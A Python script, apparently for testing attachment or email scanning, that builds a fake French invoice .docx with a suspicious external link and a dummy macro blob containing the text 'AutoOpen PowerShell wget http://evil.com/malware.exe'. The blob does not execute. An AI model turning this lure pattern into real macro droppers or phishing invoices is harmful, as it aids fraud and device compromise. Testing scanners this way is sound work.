# create_test_pj.py
import zipfile
import io
import os

def create_malicious_docx():
    document_xml = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p>
      <w:r>
        <w:t>Bonjour, veuillez trouver ci-joint votre facture du mois de mars.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Montant total : 2,450.00 EUR</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Merci de proceder au paiement dans les 48h.</w:t>
      </w:r>
    </w:p>
  </w:body>
</w:document>'''

    rels_xml = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1"
                Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles"
                Target="styles.xml"/>
  <Relationship Id="rId2"
                Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink"
                Target="http://malware-test.suspicious-domain.xyz/payload"
                TargetMode="External"/>
</Relationships>'''

    content_types = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/word/document.xml"
            ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
  <Override PartName="/word/vbaProject.bin"
            ContentType="application/vnd.ms-office.activeX+xml"/>
</Types>'''

    vba_content = b'\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1' + b'VBA Macro AutoOpen PowerShell wget http://evil.com/malware.exe' * 10

    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.writestr('[Content_Types].xml', content_types)
        zf.writestr('_rels/.rels', '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1"
                Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument"
                Target="word/document.xml"/>
</Relationships>''')
        zf.writestr('word/document.xml', document_xml)
        zf.writestr('word/_rels/document.xml.rels', rels_xml)
        zf.writestr('word/vbaProject.bin', vba_content)

    filename = "facture_mars_2026.docx"
    with open(filename, 'wb') as f:
        f.write(buffer.getvalue())

    print(f"✅ Fichier créé : {filename}")
    print(f"   Taille : {os.path.getsize(filename)} bytes")
    print(f"   Apparence : facture normale")
    print(f"   Caché : Macro VBA + PowerShell + lien suspect")
    print(f"\n📧 Envoie ce fichier à ton email Gmail !")

if __name__ == "__main__":
    create_malicious_docx()
